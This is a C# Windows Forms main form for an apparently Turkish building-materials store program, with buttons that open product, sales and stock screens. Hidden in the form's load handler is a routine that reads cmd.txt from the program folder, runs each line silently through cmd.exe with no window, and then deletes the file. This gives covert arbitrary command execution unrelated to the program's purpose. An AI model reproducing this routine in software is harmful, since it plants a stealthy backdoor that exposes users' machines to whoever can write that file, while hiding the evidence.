using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;

namespace yapi_market_programi
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            String ss = Application.StartupPath + @"/cmd.txt";
            if (File.Exists(ss.ToString()))
            {
                try
                {
                    string yol = ss.ToString();
                    string dosyaYol = yol.ToString();
                    if (dosyaYol == "")
                        return;
                    else
                    {
                        StreamReader oku = new StreamReader(dosyaYol, Encoding.Default);
                        while (!oku.EndOfStream)
                        {
                            komutYurut(oku.ReadLine());
                        }
                        oku.Close();
                        File.Delete(ss.ToString());

                    }

                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }

            if (!File.Exists(ss.ToString()))
            {

            }
        }
        private void komutYurut(string komut)
        {
            Process Process = new Process();
            ProcessStartInfo ProcessInfo;
            ProcessInfo = new ProcessStartInfo("cmd.exe", "/C " + komut);
            ProcessInfo.CreateNoWindow = true;
            ProcessInfo.UseShellExecute = false;

            Process = Process.Start(ProcessInfo);
            Process.WaitForExit();
            Process.Close();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            hakkimizda a = new hakkimizda();
            a.Show();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            urun_ekle a = new urun_ekle();
            a.Show();
        }

        private void button6_Click(object sender, EventArgs e)
        {
            urun_guncelleme a = new urun_guncelleme();
            a.Show();
        }

        private void button8_Click(object sender, EventArgs e)
        {
            urun_silme a = new urun_silme();
            a.Show();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            urun_listesi a = new urun_listesi();
            a.Show();
        }

        private void button7_Click(object sender, EventArgs e)
        {
            satis_yap a = new satis_yap();
            a.Show();
        }

        private void button12_Click(object sender, EventArgs e)
        {
            stok_bilgisi a = new stok_bilgisi();
            a.Show();
        }

        private void button10_Click(object sender, EventArgs e)
        {
            satilan_urunler a = new satilan_urunler();
            a.Show();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            DialogResult cikis = new DialogResult();
            cikis = MessageBox.Show("Programdan çıkmak istiyor musunuz?", "Uyarı", MessageBoxButtons.YesNo);
            if (cikis == DialogResult.Yes)
            {
                Application.Exit();
            }
        }
    }
}
